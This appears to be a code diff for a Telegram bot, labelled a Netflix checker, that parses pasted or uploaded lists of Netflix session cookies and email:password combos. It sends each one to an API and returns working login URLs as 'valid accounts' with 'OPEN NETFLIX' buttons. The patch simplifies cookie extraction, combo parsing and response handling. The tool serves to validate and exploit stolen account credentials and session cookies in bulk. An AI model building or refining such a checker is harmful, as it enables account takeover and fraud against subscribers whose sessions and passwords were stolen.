@@ -10,7 +10,6 @@ from collections import defaultdict
 import asyncio
 import re
 import json
-import urllib.parse
 import sys
 
 # Load environment variables
@@ -183,36 +182,43 @@ def extract_netflix_id_from_cookie(cookie_text):
     # Clean the input - remove any whitespace and newlines
     cookie_text = cookie_text.strip()
     
-    # Pattern 1: NetflixId=value format (with or without space)
+    # Pattern 1: NetflixId=value format
     match = re.search(r'NetflixId\s*=\s*([^\s\n]+)', cookie_text, re.IGNORECASE)
     if match:
         netflix_id = match.group(1).strip()
-        # Remove any trailing characters like & or |
         netflix_id = netflix_id.split('&')[0].split('|')[0].strip()
         if netflix_id:
             logger.info(f"Extracted Netflix ID from NetflixId= format: {netflix_id[:50]}...")
             return netflix_id
     
-    # Pattern 2: Direct ct%3D... format (without NetflixId prefix)
-    # Check if it starts with ct%3D or contains ct%3D at the beginning
-    if cookie_text.startswith('ct%3D') or 'ct%3D' in cookie_text:
-        # Extract from ct%3D to the end or until & or |
-        match = re.search(r'(ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
-        if match:
-            netflix_id = match.group(1).strip()
-            logger.info(f"Extracted Netflix ID from ct%3D format: {netflix_id[:50]}...")
-            return netflix_id
+    # Pattern 2: ct%3D format (most common)
+    match = re.search(r'(ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
+    if match:
+        netflix_id = match.group(1).strip()
+        logger.info(f"Extracted Netflix ID from ct%3D format: {netflix_id[:50]}...")
+        return netflix_id
     
-    # Pattern 3: URL encoded format with v%3D3%26ct%3D
+    # Pattern 3: Any URL encoded string that looks like a Netflix cookie
+    if '%3D' in cookie_text and len(cookie_text) > 50:
+        # Try to get the whole thing if it's a cookie
+        if '&' in cookie_text:
+            parts = cookie_text.split('&')
+            for part in parts:
+                if 'ct%3D' in part or 'NetflixId' in part:
+                    return part.strip()
+        logger.info(f"Using full text as Netflix ID: {cookie_text[:50]}...")
+        return cookie_text
+    
+    # Pattern 4: If it contains v%3D3 and ct%3D
     match = re.search(r'(v%3D3%26ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
     if match:
         netflix_id = match.group(1).strip()
         logger.info(f"Extracted Netflix ID from v%3D3%26ct%3D format: {netflix_id[:50]}...")
         return netflix_id
     
-    # If nothing matches, try to see if it's just the raw value
-    if len(cookie_text) > 100:
-        logger.info(f"Using raw text as Netflix ID: {cookie_text[:50]}...")
+    # If nothing matches, return the original (maybe it's already the ID)
+    if len(cookie_text) > 20:
+        logger.info(f"Using original text as Netflix ID: {cookie_text[:50]}...")
         return cookie_text
     
     logger.warning(f"Could not extract Netflix ID from: {cookie_text[:100]}")
@@ -234,75 +240,44 @@ def parse_account_line(line):
         if netflix_id:
             account['netflix_id'] = netflix_id
         
-        parts = line.split('|', 1)
-        first_part = parts[0].strip()
-        
-        # Extract email and password if present
-        if ':' in first_part and not first_part.startswith('http'):
-            email_pass = first_part.split(':', 1)
-            account['email'] = email_pass[0].strip()
-            account['password'] = email_pass[1].strip()
-        else:
-            # Try to find email in the line
-            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
-            if email_match:
-                account['email'] = email_match.group(1)
+        # Extract email if present (email:password format)
+        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
+        if email_match:
+            account['email'] = email_match.group(1)
+            # Try to find password after email
+            password_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:|\s]+([^\s|]+)', line)
+            if password_match:
+                account['password'] = password_match.group(2)
+            else:
                 account['password'] = "••••••••"
         
-        # Parse additional metadata if present
-        if len(parts) > 1:
-            remaining = parts[1]
-            
-            if '=' in remaining and ':' not in remaining:
-                fields = remaining.split('|')
-                for field in fields:
-                    field = field.strip()
-                    if '=' in field:
-                        key, value = field.split('=', 1)
-                        key = key.strip()
-                        value = value.strip()
-                        
-                        key_lower = key.lower()
-                        
-                        if 'phonenumber' in key_lower or 'phone' in key_lower:
-                            account['phone'] = value
-                        elif 'country' in key_lower:
-                            account['country'] = value
-                        elif 'plan' in key_lower:
-                            account['plan'] = value
-                        elif 'videoquality' in key_lower or 'quality' in key_lower:
-                            account['quality'] = value
-                        elif 'maxstreams' in key_lower or 'streams' in key_lower:
-                            account['streams'] = value
-                        elif 'membersince' in key_lower:
-                            account['member_since'] = value
-                        elif 'paymentmethod' in key_lower:
-                            account['payment_method'] = value
-            else:
-                fields = remaining.split('|')
-                for field in fields:
-                    field = field.strip()
-                    if ':' in field:
-                        key, value = field.split(':', 1)
-                        key = key.strip().lower()
-                        value = value.strip()
-                        
-                        if 'phone' in key:
-                            account['phone'] = value
-                        elif 'country' in key:
-                            account['country'] = value
-        
-        # If no Netflix ID found yet, try again with the whole line
-        if 'netflix_id' not in account:
-            netflix_id = extract_netflix_id_from_cookie(line)
-            if netflix_id:
-                account['netflix_id'] = netflix_id
-        
-        # If still no Netflix ID, try to extract from the first part
-        if 'netflix_id' not in account and first_part:
-            netflix_id = extract_netflix_id_from_cookie(first_part)
-            if netflix_id:
-                account['netflix_id'] = netflix_id
+        # Parse additional metadata if present (format: | Country=US | Plan=Premium)
+        if '|' in line:
+            parts = line.split('|')
+            for part in parts[1:]:  # Skip the first part which contains email/cookie
+                part = part.strip()
+                if '=' in part:
+                    key, value = part.split('=', 1)
+                    key = key.strip().lower()
+                    value = value.strip()
+                    
+                    if 'country' in key:
+                        account['country'] = value
+                    elif 'plan' in key:
+                        account['plan'] = value
+                    elif 'quality' in key:
+                        account['quality'] = value
+                    elif 'streams' in key:
+                        account['streams'] = value
+                elif ':' in part:
+                    key, value = part.split(':', 1)
+                    key = key.strip().lower()
+                    value = value.strip()
+                    
+                    if 'country' in key:
+                        account['country'] = value
+                    elif 'plan' in key:
+                        account['plan'] = value
         
         if 'netflix_id' not in account:
             logger.warning(f"No Netflix ID found in line: {line[:100]}")
@@ -313,17 +288,17 @@ def parse_account_line(line):
             account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
             account['password'] = "••••••••"
         
-        logger.info(f"Successfully parsed account: Email={account['email']}, Netflix ID={account['netflix_id'][:50]}...")
+        logger.info(f"Successfully parsed account: Email={account['email']}")
         return account
         
     except Exception as e:
         logger.error(f"Error parsing line: {e}")
         return None
 
-# ==================== FIXED API FUNCTIONS - HANDLES ANY RESPONSE FORMAT ====================
+# ==================== FIXED API FUNCTIONS ====================
 
 async def check_with_your_api(netflix_id, email="unknown@email.com"):
-    """Check Netflix ID using YOUR API - Handles multiple response formats"""
+    """Check Netflix ID using YOUR API"""
     
     if not netflix_id:
         return {
@@ -342,19 +317,18 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
         }
         
         logger.info(f"📡 Calling API for {email}")
-        logger.info(f"📡 Netflix ID: {netflix_id[:100]}...")
         
         response = requests.post(url, json=data, timeout=15)
         
         # Log raw response for debugging
         logger.info(f"📡 Response Status: {response.status_code}")
-        logger.info(f"📡 Response Text: {response.text[:500]}")
         
         # Try to parse JSON
         try:
             result = response.json()
+            logger.info(f"📡 Response: {json.dumps(result, indent=2)[:500]}")
         except:
-            logger.error(f"Failed to parse JSON response: {response.text}")
+            logger.error(f"Failed to parse JSON response: {response.text[:500]}")
             return {
                 "success": False,
                 "error": "Invalid API response format",
@@ -362,37 +336,14 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
                 "email": email
             }
         
-        # Check if the response indicates success
-        # Handle different possible response structures
-        
-        # Case 1: Response has 'success' field
+        # Check for success in different formats
         if result.get('success') == True:
-            # Try to get URLs from various possible field names
+            # Try to find URLs
             login_url = result.get('login_url') or result.get('url') or result.get('link')
             phone_url = result.get('phone_url') or result.get('mobile_url') or result.get('phone_link')
             
             if login_url:
-                return {
-                    "success": True,
-                    "login_url": login_url,
-                    "phone_url": phone_url,
-                    "email": email,
-                    "raw_response": result
-                }
-            else:
-                return {
-                    "success": False,
-                    "error": "No login URL in response",
-                    "error_code": "MISSING_URL",
-                    "email": email
-                }
-        
-        # Case 2: Response has 'status' field (alternative)
-        elif result.get('status') == 'success' or result.get('status') == 'ok':
-            login_url = result.get('login_url') or result.get('url') or result.get('link')
-            phone_url = result.get('phone_url') or result.get('mobile_url')
-            
-            if login_url:
+                logger.info(f"✅ Valid account found! Login URL: {login_url[:100]}")
                 return {
                     "success": True,
                     "login_url": login_url,
@@ -400,62 +351,16 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
                     "email": email
                 }
         
-        # Case 3: Response directly contains URLs (no success field)
-        elif result.get('login_url') or result.get('url'):
-            login_url = result.get('login_url') or result.get('url')
-            phone_url = result.get('phone_url') or result.get('mobile_url')
-            
-            return {
-                "success": True,
-                "login_url": login_url,
-                "phone_url": phone_url,
-                "email": email
-            }
+        # Check for error
+        error_msg = result.get('error') or result.get('message') or result.get('status') or 'Invalid or expired'
         
-        # Case 4: Response has 'error' field
-        elif result.get('error'):
-            return {
-                "success": False,
-                "error": result.get('error'),
-                "error_code": result.get('error_code', 'API_ERROR'),
-                "email": email
-            }
-        
-        # Case 5: Response has 'message' field
-        elif result.get('message'):
-            return {
-                "success": False,
-                "error": result.get('message'),
-                "error_code": 'API_MESSAGE',
-                "email": email
-            }
-        
-        # Case 6: Unknown format
-        else:
-            logger.warning(f"Unknown response format: {result}")
-            return {
-                "success": False,
-                "error": f"Unknown response format: {list(result.keys())}",
-                "error_code": "UNKNOWN_FORMAT",
-                "email": email
-            }
+        return {
+            "success": False,
+            "error": error_msg,
+            "error_code": result.get('error_code', 'INVALID'),
+            "email": email
+        }
                 
-    except requests.exceptions.Timeout:
-        logger.error("API request timeout")
-        return {
-            "success": False,
-            "error": "API request timeout",
-            "error_code": "TIMEOUT",
-            "email": email
-        }
-    except requests.exceptions.ConnectionError:
-        logger.error("API connection error")
-        return {
-            "success": False,
-            "error": "Cannot connect to API",
-            "error_code": "CONNECTION_ERROR",
-            "email": email
-        }
     except Exception as e:
         logger.error(f"Error checking Netflix ID: {e}")
         return {
@@ -525,9 +430,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
     
     user = update.effective_user
-    user_id = user.id
-    lang_code = get_lang(user_id)
-    lang = LANGUAGES[lang_code]
     
     welcome = f"""
 ╔══════════════════════════════════════╗
@@ -617,14 +519,12 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ==================== UPDATED CHECK COMMAND WITH MOBILE SUPPORT ====================
+# ==================== FIXED CHECK COMMAND ====================
 
 @authorized_only
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check a single Netflix ID - Now with mobile support"""
+    """Check a single Netflix ID"""
     user_id = update.effective_user.id
-    lang_code = get_lang(user_id)
-    lang = LANGUAGES[lang_code]
     
     global total_checks, valid_accounts, invalid_accounts
     
@@ -646,27 +546,22 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📝 Type: `/check` followed by your code
 
-Examples:
+Example:
 `/check ct%3DBgjHlOvcAxLuAw0y...`
-`/check NetflixId=ct%3DBgjHlOvcAxLuAw0y...`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✨ {YOUR_CREDIT} ✨
         """
         await update.message.reply_text(error_msg, parse_mode='Markdown')
         return
     
     user_input = ' '.join(context.args)
     
-    # Extract Netflix ID from various formats
+    # Extract Netflix ID
     netflix_id = extract_netflix_id_from_cookie(user_input)
     
     if not netflix_id:
-        # If extraction fails, use the raw input
         netflix_id = user_input.strip('"\'')
     
     checking_msg = await update.message.reply_text(
-        f"**⏳ Checking...** 🔍\n\n`{netflix_id[:100]}...`",
+        f"**⏳ Checking...** 🔍",
         parse_mode='Markdown'
     )
     
@@ -683,11 +578,8 @@ Examples:
         valid_accounts += 1
         
         short_id = netflix_id[:30] + "..." if len(netflix_id) > 30 else netflix_id
+        login_url = result['login_url']
         
-        # Get phone URL (fallback to PC URL if not available)
-        phone_url = result.get('phone_url', result['login_url'])
-        
-        # Updated success message with both options
         success_msg = f"""
 ╔══════════════════════════════════════╗
 ║     ✅ **NETFLIX ACCOUNT** ✅        ║
@@ -696,29 +588,24 @@ Examples:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔑 **Code:** `{short_id}`
 
-📱 **Phone Login URL:**
-`{phone_url}`
-
-💻 **PC Login URL:**
-`{result['login_url']}`
+🔗 **Login URL:**
+`{login_url}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👇 Click the buttons below to open
+👇 Click the button below to open
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✨ {YOUR_CREDIT} ✨
         """
         
-        # Create buttons for both platforms
-        keyboard = [
-            [InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)],
-            [InlineKeyboardButton("💻 OPEN ON PC", url=result['login_url'])]
-        ]
+        # Fix: Make sure the button text is correct
+        keyboard = [[InlineKeyboardButton("🎬 OPEN NETFLIX", url=login_url)]]
         
         await update.message.reply_text(
             success_msg,
             reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
+            parse_mode='Markdown',
+            disable_web_page_preview=True
         )
             
     else:
@@ -746,14 +633,12 @@ Examples:
         
         await update.message.reply_text(error_msg, parse_mode='Markdown')
 
-# ==================== UPDATED FILE HANDLER WITH MOBILE SUPPORT ====================
+# ==================== FILE HANDLER ====================
 
 @authorized_only
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded .txt files - Now with mobile support"""
+    """Handle uploaded .txt files"""
     user_id = update.effective_user.id
-    lang_code = get_lang(user_id)
-    lang = LANGUAGES[lang_code]
     
     global total_checks, valid_accounts, invalid_accounts
     
@@ -801,7 +686,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if not account or 'netflix_id' not in account:
                 invalid_count += 1
-                logger.warning(f"Skipping line {i}: No valid Netflix ID found")
                 continue
             
             if i % 3 == 0 or i == len(accounts):
@@ -826,10 +710,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
                 details_str = ' | '.join(details) if details else ''
                 
-                # Get phone URL (fallback to PC URL if not available)
-                phone_url = result.get('phone_url', result['login_url'])
-                
-                # Updated valid message with both options
                 valid_msg = f"""
 ╔══════════════════════════════════════╗
 ║     ✅ **NETFLIX ACCOUNT** ✅        ║
@@ -839,26 +719,20 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📧 **Email:** `{account.get('email', 'N/A')}`
 {details_str}
 
-📱 **Phone URL:**
-`{phone_url}`
-
-💻 **PC URL:**
+🔗 **Login URL:**
 `{result['login_url']}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👇 Click the buttons below to open
+👇 Click the button below to open
                 """
                 
-                # Create buttons for both platforms
-                keyboard = [
-                    [InlineKeyboardButton("📱 OPEN ON MOBILE", url=phone_url)],
-                    [InlineKeyboardButton("💻 OPEN ON PC", url=result['login_url'])]
-                ]
+                keyboard = [[InlineKeyboardButton("🎬 OPEN NETFLIX", url=result['login_url'])]]
                 
                 await update.message.reply_text(
                     valid_msg,
                     reply_markup=InlineKeyboardMarkup(keyboard),
-                    parse_mode='Markdown'
+                    parse_mode='Markdown',
+                    disable_web_page_preview=True
                 )
                 
             else:
@@ -903,7 +777,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Error: {e}")
         await progress_msg.edit_text(
-            f"**⚠️ Error**\n💡 Please try again\n\nError: {str(e)[:100]}",
+            f"**⚠️ Error**\n💡 Please try again",
             parse_mode='Markdown'
         )
 
@@ -922,12 +796,10 @@ def check_rate_limit(user_id, limit=5, period=60):
 async def run_bot():
     """Run the bot"""
     print("=" * 50)
-    print("🎬 NETFLIX CHECKER BOT WITH MOBILE SUPPORT")
+    print("🎬 NETFLIX CHECKER BOT")
     print("=" * 50)
     print(f"✅ Authorized Users: {len(AUTHORIZED_USERS)}")
     print(f"✅ Credit: {YOUR_CREDIT}")
-    print(f"✅ Mobile Support: Enabled")
-    print(f"✅ Cookie Format Support: Multiple formats")
     print("=" * 50)
     
     clear_telegram_webhook()
@@ -954,7 +826,7 @@ async def run_bot():
         allowed_updates=['message', 'callback_query']
     )
     
-    print("✅ Bot is running with Mobile Support!")
+    print("✅ Bot is running!")
     print("=" * 50)
     
     try:
